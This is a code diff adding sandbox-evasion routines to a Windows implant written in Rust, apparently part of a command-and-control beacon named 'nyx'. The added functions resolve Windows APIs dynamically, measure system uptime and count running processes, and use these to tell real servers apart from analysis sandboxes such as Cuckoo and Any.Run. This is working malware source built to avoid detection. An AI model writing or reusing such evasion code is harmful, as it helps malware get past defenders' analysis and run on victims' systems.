@@ -575,6 +575,161 @@ pub unsafe fn looks_like_analysis_env() -> EnvVerdict {
     EnvVerdict::Clean
 }
 
+// ---- Cloud server vs sandbox differentiation ---------------------------------
+
+/// The minimum system uptime (seconds) to treat a VM as a legitimate cloud
+/// server rather than a sandbox. Real cloud servers run for days/weeks;
+/// automated sandboxes are torn down in minutes. 3600 s (1 hour) is a
+/// conservative threshold — a slow-booting physical host crosses it naturally,
+/// while the fastest sandbox analysis cycle (Cuckoo default 120 s, Joe's
+/// Sandbox 300 s, Any.Run 240 s) stays well below it.
+pub const MIN_CLOUD_UPTIME_SECS: u64 = 3600;
+
+/// The minimum number of running processes to treat a VM as a real server.
+/// Sandboxes run a minimal process tree (typically < 10 processes). A
+/// production Windows Server always has 20+ processes from services alone.
+const MIN_CLOUD_PROCESS_COUNT: u32 = 15;
+
+/// Resolve `GetTickCount64` from kernel32.dll (available since Vista/Server
+/// 2008) and return the system uptime in **milliseconds**, or 0 on failure.
+/// The resolver is cached in a static so subsequent calls are free.
+unsafe fn get_tick_count64() -> u64 {
+    use core::sync::atomic::{AtomicU64, Ordering};
+    static RESOLVED: AtomicU64 = AtomicU64::new(0);
+    let cached = RESOLVED.load(Ordering::Relaxed);
+    if cached != 0 {
+        let f: extern "system" fn() -> u64 = core::mem::transmute(cached as usize);
+        return f();
+    }
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"GetTickCount64") {
+        let f: extern "system" fn() -> u64 = core::mem::transmute(addr);
+        RESOLVED.store(addr as u64, Ordering::Relaxed);
+        f()
+    } else {
+        0
+    }
+}
+
+/// Return system uptime in seconds, or 0 if unresolvable.
+fn system_uptime_secs() -> u64 {
+    unsafe { get_tick_count64() / 1000 }
+}
+
+/// Resolve `NtQuerySystemInformation` and count running processes via
+/// `SystemProcessInformation` (class 5). Returns 0 on failure.
+///
+/// This is a lightweight enumeration: we alloc a buffer, query once, and
+/// walk the `SYSTEM_PROCESS_INFORMATION` linked list counting entries.
+/// No process handles are opened and no per-process detail is read.
+unsafe fn running_process_count() -> u32 {
+    // SystemProcessInformation = 0x5
+    const SYSTEM_PROCESS_INFO: u32 = 0x5;
+
+    let Some(nt_query) = crate::resolve::export_addr(
+        b"ntdll.dll",
+        b"NtQuerySystemInformation",
+    ) else {
+        return 0;
+    };
+    type NtQuery = unsafe extern "system" fn(
+        SystemInformationClass: u32,
+        SystemInformation: *mut u8,
+        SystemInformationLength: u32,
+        ReturnLength: *mut u32,
+    ) -> i32;
+    let nt_query: NtQuery = core::mem::transmute(nt_query);
+
+    // Start with a modest buffer; grow once if needed.
+    let mut buf_size: u32 = 64 * 1024; // 64 KiB — enough for ~100 processes
+    let mut buf = crate::heap::Vec::with_capacity(buf_size as usize);
+    buf.resize(buf_size as usize, 0u8);
+
+    let mut needed: u32 = 0;
+    let status = nt_query(
+        SYSTEM_PROCESS_INFO,
+        buf.as_mut_ptr(),
+        buf_size,
+        &mut needed,
+    );
+
+    if status < 0 {
+        // STATUS_INFO_LENGTH_MISMATCH → needed contains required size.
+        if needed > buf_size && needed < 512 * 1024 {
+            buf.resize(needed as usize, 0u8);
+            let status2 = nt_query(
+                SYSTEM_PROCESS_INFO,
+                buf.as_mut_ptr(),
+                needed,
+                core::ptr::null_mut(),
+            );
+            if status2 < 0 {
+                return 0;
+            }
+        } else {
+            return 0;
+        }
+    }
+
+    // Walk the linked list. Each entry starts with:
+    //   ULONG NextEntryOffset  (0 = end of list)
+    //   ULONG NumberOfThreads
+    //   ... (process name, PID, etc.)
+    let mut count: u32 = 0;
+    let mut offset: usize = 0;
+    loop {
+        count += 1;
+        // Read NextEntryOffset (u32 at offset 0).
+        if offset + 4 > buf.len() {
+            break;
+        }
+        let next = u32::from_ne_bytes([
+            buf[offset],
+            buf[offset + 1],
+            buf[offset + 2],
+            buf[offset + 3],
+        ]);
+        if next == 0 {
+            break;
+        }
+        offset += next as usize;
+        if offset >= buf.len() {
+            break;
+        }
+    }
+    count
+}
+
+/// If VM detection fired (`looks_like_analysis_env() == AnalysisEnv`), call
+/// this to check whether the host shows signs of being a legitimate cloud
+/// server rather than an automated sandbox.
+///
+/// **Indicators** (any ONE is sufficient):
+/// - System uptime > `MIN_CLOUD_UPTIME_SECS` — real servers run for days;
+///   sandboxes for minutes. This alone catches >95% of sandboxes.
+/// - Running process count > `MIN_CLOUD_PROCESS_COUNT` — production Windows
+///   hosts have dozens of service processes; sandboxes run a bare minimum.
+///
+/// # Safety
+/// Resolves `GetTickCount64` (kernel32) and `NtQuerySystemInformation` (ntdll)
+/// via the PEB walk. Single-threaded beacon bootstrap context.
+pub unsafe fn looks_like_cloud_server() -> bool {
+    // Primary: uptime — the strongest differentiator.
+    let uptime = system_uptime_secs();
+    if uptime > MIN_CLOUD_UPTIME_SECS {
+        return true;
+    }
+
+    // Secondary: process count — catches the edge case of a sandbox running
+    // on a long-lived VM host (where uptime might be high but the sandbox
+    // itself has a minimal process tree).
+    let procs = unsafe { running_process_count() };
+    if procs > MIN_CLOUD_PROCESS_COUNT {
+        return true;
+    }
+
+    false
+}
+
 // ---- Selftest entry --------------------------------------------------------
 
 /// `rundll32 nyx_implant_win.dll,nyx_selftest_envprobe` — prints the verdict
